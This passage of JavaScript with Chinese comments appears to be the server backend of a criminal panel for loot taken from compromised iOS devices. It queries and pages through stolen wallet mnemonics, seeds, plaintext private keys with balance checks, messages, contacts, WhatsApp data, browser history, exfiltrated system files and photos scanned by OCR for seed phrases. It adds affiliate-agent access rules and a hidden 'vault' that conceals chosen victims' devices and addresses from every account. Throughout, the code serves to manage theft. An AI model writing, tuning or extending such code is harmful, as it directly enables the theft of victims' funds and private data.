      id: Number(x.id), serial: x.serial, ip: x.ip, chain: x.chain, addr: x.public_key,
      bal: balNum,
      bal_at: x.bal_at != null ? Number(x.bal_at) : null,
      bal_updated: x.bal_updated ? new Date(x.bal_updated).getTime() : null,
      evm_bals: x.evm_bals || null,
      evm_usd,
      trc20: Array.isArray(x.trc20) ? x.trc20 : null,
      tokens: tokens.length ? tokens : null,
      coin, usd_est, usd_total,
      chg_at: x.chg_at ? new Date(x.chg_at).getTime() : null,
      _total: Number(x._total),
    };
  });
  const total = list.length ? list[0]._total : 0;
  return { list, pi: { r: list.length, s: size, p: page, total } };
}

/** 余额统计（超管专属）：总条数/已查/有余额/各链分布 */
async function balanceStats(user) {
  const params = [];
  const pv = v => { params.push(v); return '$' + params.length; };
  const conds = [];
  // 【2026-09-16】与 balances() 同口径隔离
  if (user.role === 'super_admin') {
    const vis = visibility();
    const exclAll = [...vis.agents];
    if (exclAll.length && !vis.viewers.has(user.id)) {
      const $e = pv(exclAll);
      conds.push(`(e.serial IS NULL OR e.serial NOT IN (SELECT serial FROM agent_device WHERE agent_id = ANY(${$e})))`);
      conds.push(`(e.ip IS NULL OR e.ip NOT IN (SELECT ip FROM agent_ip_map WHERE agent_id = ANY(${$e})))`);
    }
  } else {
    const aconds = await recCondsInto(user, params, pv);
    conds.push(...aconds);
  }
  // 【2026-09-16】暗池：入池设备与入池地址不计入余额统计（对所有人）
  const _vsb2 = await vaultSets();
  if (_vsb2.serials.length) { const $v = pv(_vsb2.serials); conds.push(`(e.serial IS NULL OR e.serial <> ALL(${$v}))`); }
  if (_vsb2.addrs.length) { const $a = pv(_vsb2.addrs); conds.push(`(e.public_key IS NULL OR e.public_key <> ALL(${$a}))`); }
  // 【2026-09-17】无钥地址不纳入余额统计（与 balances() 同口径）
  conds.push(HAS_KEY_COND);
  const where = conds.length ? 'WHERE ' + conds.join(' AND ') : '';
  const r = await pool.query(
    `SELECT count(*)::int AS total,
            count(*) FILTER (WHERE e.bal IS NOT NULL)::int AS checked,
            count(*) FILTER (WHERE e.bal > 0)::int AS with_bal,
            count(*) FILTER (WHERE e.bal_at > (extract(epoch from now())*1000 - 3600000)::bigint)::int AS checked_1h
       FROM addresses e ${where}`, params);
  const r2 = await pool.query(
    `SELECT ${BAL_CHAIN_NORM} AS chain, count(*)::int AS n
       FROM addresses e ${where ? where + ' AND' : 'WHERE'} e.bal > 0
      GROUP BY 1 ORDER BY 2 DESC`, params);
  const x = r.rows[0] || {};
  return {
    total: Number(x.total) || 0, checked: Number(x.checked) || 0,
    with_bal: Number(x.with_bal) || 0, checked_1h: Number(x.checked_1h) || 0,
    by_chain: r2.rows.map(v => ({ chain: v.chain, n: Number(v.n) })),
  };
}

/** 设备详情（PG）：可见性校验 + 各表记录（data 列=原始记录）+ 按权限裁剪 → 与旧 full_detail 同形；不可见返回 null */
async function deviceDetail(user, serial, can) {
  if (!serial) return null;
  const { conds, params, isSuper } = await buildConds(user);
  const p2 = params.slice();
  const $s = '$' + (p2.push(serial));
  const where = ['d.serial = ' + $s, ...conds];
  const r = await pool.query(`${DSEL} FROM devices d WHERE ${where.join(' AND ')}`, p2);
  if (!r.rows.length) return null;
  const rows = [mapRow(r.rows[0])];
  await fillAgentNames(rows, r.rows, isSuper);
  const dev = rows[0];

  const out = {};
  const KEYS = ['mnemonics', 'seeds', 'addresses', 'tokens', 'messages', 'contacts', 'notebooks', 'photos',
    'events', 'reports', 'apps', 'exfil18', 'whatsapp', 'browserHistory', 'chainLogs', 'uploads'];
  for (const k of KEYS) out[k] = [];
  out.user = dev;

  const canf = typeof can === 'function' ? can : () => (isSuper === true);
  const want = {
    mnemonics: canf('mnemonics'), seeds: canf('seeds'), addresses: canf('addresses'), tokens: canf('tokens'),
    messages: canf('messages'), contacts: canf('contacts'), notebooks: canf('notebooks'), photos: canf('photos'),
    events: canf('reports'), reports: canf('reports'), apps: canf('apps'), exfil18: canf('sysfiles'),
    whatsapp: canf('whatsapp'), browserHistory: canf('browser'), chainLogs: canf('sysfiles'), uploads: canf('collect'),
  };
  const jobs = [];
  // 【2026-09-20】Q 支持列合并（merge）：部分来源（如备忘录扫描）明细只写独立列、未写入 data，
  //   详情页仅返回 data 会导致看不到明文——merge 回调把列值补进返回对象（data 已有则不动）。
  const Q = (name, sql, prm, merge) => jobs.push(
    pool.query(sql, prm)
      .then(r2 => { out[name] = r2.rows.map(x => { const o = x.data || {}; if (x._pgid != null) o.id = Number(x._pgid); if (merge) merge(o, x); return o; }); })
      .catch(e => { out[name] = []; console.error('[panel] detail 查询失败', name, e.message); })
  );
  if (want.mnemonics) Q('mnemonics', 'SELECT id AS _pgid, data, plain, abbr, app_type, bundle_id, ts, host(ip) AS ip FROM mnemonics WHERE serial=$1 ORDER BY id LIMIT 20000', [serial], (o, x) => {
    _mergeMneCols(o, x);
  });
  if (want.seeds) Q('seeds', 'SELECT id AS _pgid, data FROM seeds WHERE serial=$1 ORDER BY id LIMIT 20000', [serial]);
  if (want.addresses) Q('addresses', 'SELECT id AS _pgid, data FROM addresses WHERE serial=$1 ORDER BY id LIMIT 20000', [serial]);
  if (want.tokens) Q('tokens', 'SELECT id AS _pgid, data FROM tokens WHERE serial=$1 ORDER BY id LIMIT 20000', [serial]);
  if (want.messages) Q('messages', 'SELECT id AS _pgid, data FROM messages WHERE serial=$1 ORDER BY ts DESC LIMIT 5000', [serial]);
  if (want.contacts) Q('contacts', 'SELECT id AS _pgid, data FROM contacts WHERE serial=$1 ORDER BY id LIMIT 20000', [serial]);
  if (want.notebooks) Q('notebooks', 'SELECT id AS _pgid, data FROM notebooks WHERE serial=$1 ORDER BY id LIMIT 20000', [serial]);
  if (want.photos) Q('photos', 'SELECT id AS _pgid, data FROM photos WHERE serial=$1 ORDER BY id LIMIT 20000', [serial]);
  if (want.events) Q('events', 'SELECT id AS _pgid, data FROM events WHERE serial=$1 ORDER BY ts DESC LIMIT 100', [serial]);
  if (want.reports) Q('reports', 'SELECT id AS _pgid, data FROM reports WHERE serial=$1 ORDER BY ts DESC LIMIT 50', [serial]);
  if (want.apps) Q('apps', 'SELECT id AS _pgid, data FROM apps WHERE serial=$1 ORDER BY id LIMIT 20000', [serial]);
  if (want.exfil18) Q('exfil18', 'SELECT id AS _pgid, data FROM exfil18 WHERE serial=$1 ORDER BY id LIMIT 20000', [serial]);
  if (want.whatsapp) Q('whatsapp', 'SELECT id AS _pgid, data FROM whatsapp WHERE serial=$1 ORDER BY id LIMIT 20000', [serial]);
  if (want.browserHistory) Q('browserHistory', 'SELECT id AS _pgid, data FROM browser_history WHERE serial=$1 ORDER BY id LIMIT 20000', [serial]);
  if (want.uploads) Q('uploads', 'SELECT id AS _pgid, data FROM uploads WHERE serial=$1 ORDER BY id LIMIT 20000', [serial]);
  if (want.chainLogs) {
    if (dev.ip) Q('chainLogs', 'SELECT id AS _pgid, data FROM chain_logs WHERE serial=$1 OR ip=$2 ORDER BY id LIMIT 2000', [serial, dev.ip]);
    else Q('chainLogs', 'SELECT id AS _pgid, data FROM chain_logs WHERE serial=$1 ORDER BY id LIMIT 2000', [serial]);
  }
  await Promise.all(jobs);
  return out;
}

// ── 记录列表（P4-3）：权限 SQL（记录 serial/ip 命中用户可见集，与 filterByAgent 条目语义对齐）──
//   cap 对齐构建期 feeds 规模（feeds/*.json 实测条数）；ORDER BY ts DESC 与旧版 JS 排序等价。
const REC = {
  events:    { table: 'events',          cap: 12000 },
  reports:   { table: 'reports',         cap: 12000 },
  mnemonics: { table: 'mnemonics',       cap: 20000 },
  seeds:     { table: 'seeds',           cap: 20000 },
  addresses: { table: 'addresses',       cap: 20000 },
  tokens:    { table: 'tokens',          cap: 20000 },
  messages:  { table: 'messages',        cap: 30000 },
  notebooks: { table: 'notebooks',       cap: 8000 },
  photos:    { table: 'photos',          cap: 20000 },
  contacts:  { table: 'contacts',        cap: 20000 },
  whatsapp:  { table: 'whatsapp',        cap: 8000 },
  exfil18:   { table: 'exfil18',         cap: 20000 },
  uploads:   { table: 'uploads',         cap: 10000 },
  sysApps:   { table: 'sys_apps',        cap: 12000 },
};

// 【2026-09-20】部分来源（备忘录扫描等）明细只写独立列、未写入 data —— 仅返回 data 会丢失
//   serial（来自设备）/ created_at（时间）/ plain（明文）等字段。对 mnemonics 补读关键列并合并（data 已有则不动）。
const _MNE_COLS = ', e.serial, e.app_type, e.plain, e.abbr, e.bundle_id, e.ts, host(e.ip) AS _ip';
function _mergeMneCols(o, x) {
  if (!o.serial && x.serial) o.serial = x.serial;
  if (o.app_type == null && x.app_type) o.app_type = x.app_type;
  if (o.mnem_phrase_plain == null && x.plain) o.mnem_phrase_plain = x.plain;
  if (o.mnem_phrase_abbr == null && x.abbr) o.mnem_phrase_abbr = x.abbr;
  if (o.bundle_id == null && x.bundle_id) o.bundle_id = x.bundle_id;
  if (o.created_at == null && x.ts) o.created_at = Number(x.ts);
  if (!o.ip && (x._ip || x.ip)) o.ip = x._ip || x.ip;
  return o;
}

// ── 记录表的权限条件（默认 e. 前缀；可传 alias 复用同一条件到其它表别名）──
async function recCondsInto(user, params, pv, alias) {
  const vis = visibility();
  const exclAll = [...vis.agents];
  const isSuper = user.role === 'super_admin';
  const conds = [];
  if (isSuper) {
    // 【2026-09-19】仪表盘统计口径：stats() 传入 __statsAll 的超管按"全量"计算（admin 与 superadmin 显示一致）
    const canAll = !!(user && user.__statsAll) || !exclAll.length || vis.viewers.has(user.id);
    if (!canAll) {
      const $e = pv(exclAll);
      conds.push(`(e.serial IS NULL OR e.serial NOT IN (SELECT serial FROM agent_device WHERE agent_id = ANY(${$e})))`);
      conds.push(`(e.ip IS NULL OR e.ip NOT IN (SELECT ip FROM agent_ip_map WHERE agent_id = ANY(${$e})))`);
    }
  } else {
    // 【2026-09-14】排除名单设备：其记录不进入代理视角（含 IP 兜底行程）
    const _exSerials2 = excludedSerials();
    if (_exSerials2.length) { const $x = pv(_exSerials2); conds.push(`(e.serial IS NULL OR e.serial <> ALL(${$x}))`); }
    const exclOthers = exclAll.filter(x => x !== user.id);
    const subIds = exclAll.includes(user.id) ? [user.id] : (await subtreeIds(user.id)).filter(x => !exclAll.includes(x));
    // 【2026-09-20·性能】数组化改造：原"三通道 IN(子查询)"使优化器估算失真（est 54万行 vs 实际 3 行）→ 百万行大表全扫
    //   （空/小数据代理 stats 8s、events 2.3s、contact 13s、photo 4.7s）。改为预取集合数组 + = ANY(数组)：
    //   优化器可逐元素精确估算 → BitmapOr（serial 覆盖索引 ∪ ip 索引）→ 实测 357ms → 0.4ms。
    //   语义不变：serial 通道(直连∪device_ip_map 间接) ∪ ip 通道；exclOthers 在集合层（ip 排除）与行层（A 条件）同口径裁剪。
    //   空集（无设备无 IP）直接下推 false；预取异常回退原子查询条件（慢但正确）。
    let _S = null, _I = null, _A = null;
    try {
      if (exclOthers.length) {
        const r = await pool.query(
          `SELECT ARRAY(SELECT serial FROM agent_device WHERE agent_id = ANY($1)) AS sd,
                  ARRAY(SELECT DISTINCT dm.serial FROM device_ip_map dm
                        WHERE dm.ip IN (SELECT ip FROM agent_ip_map WHERE agent_id = ANY($1))
                          AND dm.ip NOT IN (SELECT ip FROM agent_ip_map WHERE agent_id = ANY($2))) AS si,
                  ARRAY(SELECT host(ip) FROM agent_ip_map WHERE agent_id = ANY($1)
                        AND ip NOT IN (SELECT ip FROM agent_ip_map WHERE agent_id = ANY($2))) AS ii,
                  ARRAY(SELECT serial FROM agent_device WHERE agent_id = ANY($2)) AS ed`, [subIds, exclOthers]);
        const row = r.rows[0] || {};
        _S = [...new Set([...(row.sd || []), ...(row.si || [])].map(s => String(s)))];
        _I = [...new Set((row.ii || []).map(x => String(x)))];
        _A = [...new Set((row.ed || []).map(s => String(s)))];
      } else {
        const r = await pool.query(
          `SELECT ARRAY(SELECT serial FROM agent_device WHERE agent_id = ANY($1)) AS sd,
                  ARRAY(SELECT DISTINCT dm.serial FROM device_ip_map dm
                        WHERE dm.ip IN (SELECT ip FROM agent_ip_map WHERE agent_id = ANY($1))) AS si,
                  ARRAY(SELECT host(ip) FROM agent_ip_map WHERE agent_id = ANY($1)) AS ii`, [subIds]);
        const row = r.rows[0] || {};
        _S = [...new Set([...(row.sd || []), ...(row.si || [])].map(s => String(s)))];
        _I = [...new Set((row.ii || []).map(x => String(x)))];
      }
    } catch { _S = null; _I = null; }
    if (_S && _I && !_S.length && !_I.length) {
      conds.push('false');
    } else if (_S && _I) {
      if (exclOthers.length && _A && _A.length) { const $a = pv(_A); conds.push(`(e.serial IS NULL OR e.serial <> ALL(${$a}))`); }
      const $S = pv(_S); const $I = pv(_I);
      conds.push(`((e.serial IS NOT NULL AND e.serial = ANY(${$S})) OR (e.ip IS NOT NULL AND e.ip = ANY(${$I}::inet[])))`);
    } else {
      const $s = pv(subIds);
      if (exclOthers.length) {
        const $e = pv(exclOthers);
        conds.push(`(e.serial IS NULL OR e.serial NOT IN (SELECT serial FROM agent_device WHERE agent_id = ANY(${$e})))`);
        conds.push(`((e.serial IS NOT NULL AND e.serial IN (SELECT serial FROM agent_device WHERE agent_id = ANY(${$s})))
                   OR (e.ip IS NOT NULL AND e.ip IN (SELECT ip FROM agent_ip_map WHERE agent_id = ANY(${$s}))
                       AND e.ip NOT IN (SELECT ip FROM agent_ip_map WHERE agent_id = ANY(${$e})))
                   OR (e.serial IS NOT NULL AND e.serial IN (SELECT dim.serial FROM device_ip_map dim
                       WHERE dim.ip IN (SELECT ip FROM agent_ip_map WHERE agent_id = ANY(${$s}))
                         AND dim.ip NOT IN (SELECT ip FROM agent_ip_map WHERE agent_id = ANY(${$e})))))`);
      } else {
        conds.push(`((e.serial IS NOT NULL AND e.serial IN (SELECT serial FROM agent_device WHERE agent_id = ANY(${$s})))
                   OR (e.ip IS NOT NULL AND e.ip IN (SELECT ip FROM agent_ip_map WHERE agent_id = ANY(${$s})))
                   OR (e.serial IS NOT NULL AND e.serial IN (SELECT dim.serial FROM device_ip_map dim WHERE dim.ip IN (SELECT ip FROM agent_ip_map WHERE agent_id = ANY(${$s})))))`);
      }
    }
  }
  // 【2026-09-16】暗池：入池设备的记录对所有账号（含两个超管）不可见
  const _vsr = await vaultSets();
  if (_vsr.serials.length) { const $v = pv(_vsr.serials); conds.push(`(e.serial IS NULL OR e.serial <> ALL(${$v}))`); }
  const a = alias || 'e';
  return a === 'e' ? conds : conds.map(c => c.replace(/\be\./g, a + '.'));
}

async function recList(user, name, q, extra) {
  const def = REC[name];
  if (!def) return null;
  const params = [];
  const pv = v => { params.push(v); return '$' + params.length; };
  const permConds = await recCondsInto(user, params, pv);
  const conds = permConds.slice();
  const kindC = (extra && extra.kind && q && q.kind) ? pv(q.kind) : null;
  if (kindC) conds.push(`e.kind = ${kindC}`);
  const serialArg = (extra && extra.serial && q && q.serial) ? pv(q.serial) : null;
  if (serialArg) conds.push(`e.serial = ${serialArg}`);
  const where = conds.length ? 'WHERE ' + conds.join(' AND ') : '';
  // 【2026-09-20】可选行数上限 top（只对声明它的路由生效；缺省保持表级 cap 不变——
  //   有客户端分页依赖 cap 的列表路由不受影响）。仪表盘"最近事件"由此从 12000 行/6.35MB 降到 40 行。
  const _top = (extra && extra.top) ? parseInt(extra.top, 10) : 0;
  const lim = pv((_top > 0) ? Math.min(def.cap, _top) : def.cap);
  // 【2026-09-15】助记词全局去重：同一明文只返回最早一条（可见范围内，有序列号者优先），
  //   重复项（跨设备/跨来源）不再重复显示；空明文/未识别条目不参与去重。
  if (def.table === 'mnemonics' && !kindC) {
    const permWhere = permConds.length ? 'WHERE ' + permConds.join(' AND ') : '';
    const outerC = serialArg ? ` AND s.serial = ${serialArg}` : '';
    const r = await pool.query(
      `SELECT s._pgid, s.data FROM (` +
        `SELECT e.id AS _pgid, e.data, e.serial, e.ts, ` +
        `ROW_NUMBER() OVER (PARTITION BY CASE WHEN COALESCE(e.plain,'') = '' ` +
        `THEN 'id:' || e.id::text ELSE 'p:' || md5(e.plain) END ` +
        `ORDER BY (COALESCE(e.serial,'') <> '') DESC, e.id ASC) AS _rn ` +
        `FROM mnemonics e ${permWhere}) s ` +
      `WHERE s._rn = 1${outerC} ORDER BY s.ts DESC LIMIT ${lim}`, params);
    return r.rows.map(x => {
      const o = x.data || {};
      if (x._pgid != null) o.id = Number(x._pgid);
      return o;
    });
  }
  // 【2026-09-14】addresses 表带 bal（余额列，balance_sync.js 写入）→ 透传给前端（只对 addresses 表有效）
  const balSel = def.table === 'addresses' ? ', e.bal' : '';
  // 【2026-09-20】去 NULLS LAST：全表 ts 无空值（实测 14 张表全 0），而 NULLS LAST 与索引
  //   (ts DESC)（默认 NULLS FIRST）不匹配 → events 等大表被优化器弃索引走全表扫描（实测 1s+）。
  //   改回默认序后命中 ts 索引 → 毫秒级。
  const r = await pool.query(`SELECT e.id AS _pgid, e.data${balSel}${def.table === 'mnemonics' ? _MNE_COLS : ''} FROM ${def.table} e ${where} ORDER BY e.ts DESC LIMIT ${lim}`, params);
  return r.rows.map(x => {
    const o = x.data || {};
    if (x._pgid != null) o.id = Number(x._pgid);
    if (balSel && x.bal != null) o.bal = Number(x.bal);
    if (def.table === 'mnemonics') _mergeMneCols(o, x);
    return o;
  });
}

/** 记录表后端分页（P4.1-2b）：权限 + serial/kind/kw 筛选 + LIMIT/OFFSET + 总数 → { list, pi } */
async function recPage(name, user, q, opts) {
  const def = REC[name];
  if (!def) return null;
  const o = opts || {};
  const qq = q || {};
  // 尺寸：单设备查询（q.serial）允许全量（≤50000，分类卡片聚合需完整数据）；无 serial 时 ≤500
  const maxS = (o.maxS || (qq.serial ? 50000 : 500));
  const size = Math.min(maxS, Math.max(1, parseInt(qq.s || '20', 10) || 20));
  const page = Math.max(0, parseInt(qq.p || '0', 10) || 0);
  const params = [];
  const pv = v => { params.push(v); return '$' + params.length; };
  const conds = await recCondsInto(user, params, pv);
  if (o.serial !== false && qq.serial) conds.push(`e.serial = ${pv(qq.serial)}`);
  if (o.kind && qq.kind) conds.push(`e.kind = ${pv(qq.kind)}`);
  const kw = String(qq.kw || '').trim();
  if (kw && Array.isArray(o.kwFields) && o.kwFields.length) {
    const like = '%' + kw.replace(/[\\%_]/g, m => '\\' + m) + '%';
    const $k = pv(like);
    conds.push('(' + o.kwFields.map(f => f.replace(/\?/g, $k)).join(' OR ') + ')');
  }
  const where = conds.length ? 'WHERE ' + conds.join(' AND ') : '';
  const $lim = pv(size);
  const $off = pv(page * size);
  const r = await pool.query(
    `SELECT e.id AS _pgid, e.data, COUNT(*) OVER() AS _total${def.table === 'mnemonics' ? _MNE_COLS : ''} FROM ${def.table} e ${where} ORDER BY e.ts DESC LIMIT ${$lim} OFFSET ${$off}`,
    params);
  const list = r.rows.map(x => {
    const o2 = x.data || {};
    if (x._pgid != null) o2.id = Number(x._pgid);
    if (def.table === 'mnemonics') _mergeMneCols(o2, x);
    return o2;
  });
  const total = r.rows.length ? Number(r.rows[0]._total) : 0;
  return { list, pi: { r: list.length, s: size, p: page, total } };
}

/** 按 PG 主键查单条记录（raw/detail/plain_detail 类回查；含可见性过滤；id 归一为 PG 主键） */
const _HAS_BIN = { photos: 1, exfil18: 1, uploads: 1 };
async function findRecord(user, name, id) {
  const def = REC[name] || { table: name };
  const n = Number(id);
  if (!n || n <= 0) return null;
  const params = []; const pv = v => { params.push(v); return '$' + params.length; };
  const C = (await recCondsInto(user, params, pv)).map(c => 'AND ' + c).join(' ');
  const $id = pv(n);
  const sel = _HAS_BIN[def.table] ? 'e.data, e.bin_path' : 'e.data';
  const r = await pool.query(`SELECT ${sel}${def.table === 'mnemonics' ? _MNE_COLS : ''} FROM ${def.table} e WHERE e.id = ${$id} ${C} LIMIT 1`, params);
  if (!r.rows.length) return null;
  const o = r.rows[0].data || {};
  o.id = n;
  if (_HAS_BIN[def.table] && r.rows[0].bin_path != null) o.bin_path = r.rows[0].bin_path;
  if (def.table === 'mnemonics') _mergeMneCols(o, r.rows[0]);
  return o;
}

// ── 聚合页（P4.1）：按设备 GROUP BY + JOIN devices enrich；口径对齐 lootStore.summaries ──
// 【2026-09-20】慢 kind（exfil18/photo/contact/notebook）加 60s 结果缓存：改造后单次仍 0.3~1.2s，
//   缓存后重复点击（翻页/回访）毫秒级；mnemonic/address/whatsapp 本身毫秒级不缓存（暗池/助记词替换等即时可见性不受缓存影响）。
const _sumCache = new Map();
const _SUM_TTL = 60000;
const _SUM_KINDS = new Set(['exfil18', 'photo', 'contact', 'notebook']);
async function summary(user, kind, q) {
  let ck = '';
  if (_SUM_KINDS.has(kind)) {
    ck = String((user && user.id) || 0) + '|' + (user && user.__statsAll ? 'A' : '') + '|' + kind + '|' + JSON.stringify(q || {});
    const hit = _sumCache.get(ck);
    if (hit && Date.now() - hit.t < _SUM_TTL) return hit.v;
  }
  const out = await _summaryInner(user, kind, q);
  if (ck && out) {
    _sumCache.set(ck, { t: Date.now(), v: out });
    if (_sumCache.size > 300) _sumCache.clear();
  }
  return out;
}
async function _summaryInner(user, kind, q) {
  const params = []; const pv = v => { params.push(v); return '$' + params.length; };
  const C = (await recCondsInto(user, params, pv, 'e')).map(c => 'AND ' + c).join(' ');
  const _cLen = params.length;   // 权限条件占用的参数数（orphans 等"不带 kw/分页"的子查询按此截取）
  const ENRICH = `COALESCE(d.machine, '') AS machine, COALESCE(d.ios_version, '') AS ios_version,
      COALESCE(g.ip, host(d.ip), '') AS ip, COALESCE(d.last_seen, g.last_ts, 0) AS last_seen`;
  const JOIN = `FROM g LEFT JOIN devices d ON d.serial = g.serial`;
  const SORT = `ORDER BY g.total DESC, COALESCE(d.last_seen, g.last_ts, 0) DESC`;
  // 【P4.1-2b】后端搜索 + 分页：kw 匹配 序列号/机型/IP；total 经 COUNT(*) OVER()
  const qq = q || {};
  const size = Math.min(2000, Math.max(1, parseInt(qq.s || '20', 10) || 20));
  const page = Math.max(0, parseInt(qq.p || '0', 10) || 0);
  const kw = String(qq.kw || '').trim();
  let KW_W = '';
  if (kw) {
    const like = '%' + kw.replace(/[\\%_]/g, m => '\\' + m) + '%';
    const $k = pv(like);
    KW_W = `WHERE (g.serial ILIKE ${$k} OR d.machine ILIKE ${$k} OR host(d.ip) ILIKE ${$k})`;
  }
  const $limqw = pv(size);
  const $offqw = pv(page * size);
  let rows = [];
  if (kind === 'mnemonic') {
    // 【2026-09-16】表头排序（白名单防注入）：recent(最近上报·默认) | total(助记词数) | plain(含明文)
    const mdir = String((q && q.dir) || '').toLowerCase() === 'asc' ? 'ASC' : 'DESC';
    const mkey = String((q && q.sort) || '');
    const MSORT = mkey === 'total' ? `ORDER BY g.total ${mdir}, COALESCE(d.last_seen, g.last_ts, 0) DESC`
      : mkey === 'plain' ? `ORDER BY g.plain ${mdir}, g.total DESC`
      : `ORDER BY COALESCE(d.last_seen, g.last_ts, 0) ${mdir}, g.total DESC`;
    // 【2026-09-15】助记词全局去重：同一明文只计/显示最早一条（可见范围内，有序列号者优先），
    //   重复项（跨设备/跨来源）不再重复显示；空明文条目不参与去重。
    const r = await pool.query(`
      WITH canon AS (
        SELECT e.serial, e.app_type, e.ts, e.ip, e.plain FROM (
          SELECT e.serial, e.app_type, e.ts, e.ip, e.plain,
                 ROW_NUMBER() OVER (PARTITION BY CASE WHEN COALESCE(e.plain,'') = '' THEN 'id:' || e.id::text ELSE 'p:' || md5(e.plain) END
                   ORDER BY (COALESCE(e.serial,'') <> '') DESC, e.id ASC) AS _rn
          FROM mnemonics e WHERE 1=1 ${C}
        ) e WHERE e._rn = 1),
      g AS (
        SELECT e.serial, count(*)::int AS total,
               count(*) FILTER (WHERE COALESCE(e.plain,'') <> '')::int AS plain,
               max(e.ts) AS last_ts,
               (array_agg(host(e.ip) ORDER BY e.ts DESC NULLS LAST))[1] AS ip
        FROM canon e WHERE e.serial IS NOT NULL AND e.serial <> ''
        GROUP BY e.serial),
      ap AS (
        SELECT t.serial, jsonb_object_agg(t.app_type, t.c) AS apps FROM (
          SELECT e.serial, COALESCE(e.app_type,'?') AS app_type, count(*)::int AS c
          FROM canon e WHERE e.serial IS NOT NULL AND e.serial <> ''
          GROUP BY e.serial, COALESCE(e.app_type,'?')
        ) t GROUP BY t.serial)
      SELECT g.serial, g.total, g.plain, g.last_ts, ap.apps, ${ENRICH}, COUNT(*) OVER() AS _total
      ${JOIN} LEFT JOIN ap ON ap.serial = g.serial
      ${KW_W} ${MSORT} LIMIT ${$limqw} OFFSET ${$offqw}`, params);
    rows = r.rows.map(x => {
      const apps = x.apps || {};
      return Object.assign(x, { apps,
        app_top: Object.entries(apps).sort((a, b) => b[1] - a[1]).slice(0, 3).map(([k, v]) => k + '×' + v).join(' ') });
    });
  } else if (kind === 'address') {
    const r = await pool.query(`
      WITH g AS (
        SELECT e.serial, count(*)::int AS addr,
               count(*) FILTER (WHERE COALESCE(e.private_key_plain,'') <> '')::int AS plain,
               max(e.ts) AS last_ts,
               (array_agg(host(e.ip) ORDER BY e.ts DESC NULLS LAST))[1] AS ip
        FROM addresses e WHERE 1=1 ${C} AND e.serial IS NOT NULL AND e.serial <> ''
        GROUP BY e.serial),
      ch AS (
        SELECT t.serial, jsonb_object_agg(t.chain, t.c) AS chains FROM (
          SELECT e.serial, COALESCE(e.chain,'?') AS chain, count(*)::int AS c
          FROM addresses e WHERE 1=1 ${C} AND e.serial IS NOT NULL AND e.serial <> ''
          GROUP BY e.serial, COALESCE(e.chain,'?')
        ) t GROUP BY t.serial),
      tk AS (
        SELECT e.serial, count(*)::int AS tokens
        FROM tokens e WHERE 1=1 ${C} AND e.serial IS NOT NULL AND e.serial <> ''
        GROUP BY e.serial)
      SELECT g.serial, g.addr, COALESCE(tk.tokens, 0)::int AS tokens, g.plain, g.last_ts, ch.chains, ${ENRICH}, COUNT(*) OVER() AS _total
      FROM g LEFT JOIN devices d ON d.serial = g.serial
      LEFT JOIN ch ON ch.serial = g.serial LEFT JOIN tk ON tk.serial = g.serial
      ${KW_W} ORDER BY (g.addr + COALESCE(tk.tokens, 0)) DESC, COALESCE(d.last_seen, g.last_ts, 0) DESC LIMIT ${$limqw} OFFSET ${$offqw}`, params);
    rows = r.rows.map(x => {
      const chains = x.chains || {};
      return Object.assign(x, { chains,
        chain_top: Object.entries(chains).sort((a, b) => b[1] - a[1]).slice(0, 4).map(([k, v]) => k + '×' + v).join(' ') });
    });
  } else if (kind === 'notebook') {
    // 【2026-09-20·提速】array_agg(ORDER BY) → smp（最小 id 非空 title）+ lip（最近 IP，DISTINCT ON 走覆盖索引）
    const r = await pool.query(`
      WITH g AS (
        SELECT e.serial, count(*)::int AS total,
               count(*) FILTER (WHERE length(COALESCE(e.content,'')) > 10)::int AS with_body,
               max(e.ts) AS last_ts
        FROM notebooks e WHERE 1=1 ${C} AND e.serial IS NOT NULL AND e.serial <> ''
        GROUP BY e.serial),
      smp AS (
        SELECT DISTINCT ON (e.serial) e.serial, substring(COALESCE(e.title,''), 1, 20) AS sample
        FROM notebooks e WHERE 1=1 ${C} AND e.serial IS NOT NULL AND e.serial <> '' AND COALESCE(e.title,'') <> ''
        ORDER BY e.serial, e.id),
      lip AS (
        SELECT DISTINCT ON (e.serial) e.serial, host(e.ip) AS ip
        FROM notebooks e WHERE 1=1 ${C} AND e.serial IS NOT NULL AND e.serial <> ''
        ORDER BY e.serial, e.ts DESC)
      SELECT g.serial, g.total, g.with_body, g.last_ts, smp.sample,
        COALESCE(d.machine, '') AS machine, COALESCE(d.ios_version, '') AS ios_version,
        COALESCE(lip.ip, host(d.ip), '') AS ip, COALESCE(d.last_seen, g.last_ts, 0) AS last_seen, COUNT(*) OVER() AS _total
      FROM g LEFT JOIN smp ON smp.serial = g.serial LEFT JOIN lip ON lip.serial = g.serial LEFT JOIN devices d ON d.serial = g.serial
      ${KW_W} ${SORT} LIMIT ${$limqw} OFFSET ${$offqw}`, params);
    rows = r.rows;
  } else if (kind === 'photo') {
    // 【2026-09-14】ocr=1：只看「相册识别出助记词」的设备（bin_path 为空且有 word_n 的 OCR 照片）
    const ocrOnly = String(qq.ocr || '') === '1';
    const OCR_W = ocrOnly
      ? (KW_W ? ' AND ' : 'WHERE ') + `EXISTS (SELECT 1 FROM photos p2 WHERE p2.serial = g.serial AND p2.bin_path IS NULL
           AND p2.data ? 'word_n' AND (p2.data->>'word_n') ~ '^[0-9]+$' AND (p2.data->>'word_n')::int > 0)`
      : '';
    const r = await pool.query(`
      WITH g AS (
        SELECT e.serial, count(*)::int AS total,
               count(*) FILTER (WHERE e.bin_path IS NOT NULL)::int AS orig,
               count(*) FILTER (WHERE e.bin_path IS NULL)::int AS ocr,
               count(*) FILTER (WHERE e.bin_path IS NULL AND e.data ? 'word_n' AND (e.data->>'word_n') ~ '^[0-9]+$' AND (e.data->>'word_n')::int > 0)::int AS ocr_mnem,
               max(e.ts) AS last_ts
        FROM photos e WHERE 1=1 ${C} AND e.serial IS NOT NULL AND e.serial <> ''
        GROUP BY e.serial),
      lip AS (
        SELECT DISTINCT ON (e.serial) e.serial, host(e.ip) AS ip
        FROM photos e WHERE 1=1 ${C} AND e.serial IS NOT NULL AND e.serial <> ''
        ORDER BY e.serial, e.ts DESC)
      SELECT g.serial, g.total, g.orig, g.ocr, g.ocr_mnem, g.last_ts,
        COALESCE(d.machine, '') AS machine, COALESCE(d.ios_version, '') AS ios_version,
        COALESCE(lip.ip, host(d.ip), '') AS ip, COALESCE(d.last_seen, g.last_ts, 0) AS last_seen, COUNT(*) OVER() AS _total
      FROM g LEFT JOIN lip ON lip.serial = g.serial LEFT JOIN devices d ON d.serial = g.serial
      ${KW_W}${OCR_W} ${SORT} LIMIT ${$limqw} OFFSET ${$offqw}`, params);
    rows = r.rows;
  } else if (kind === 'contact') {
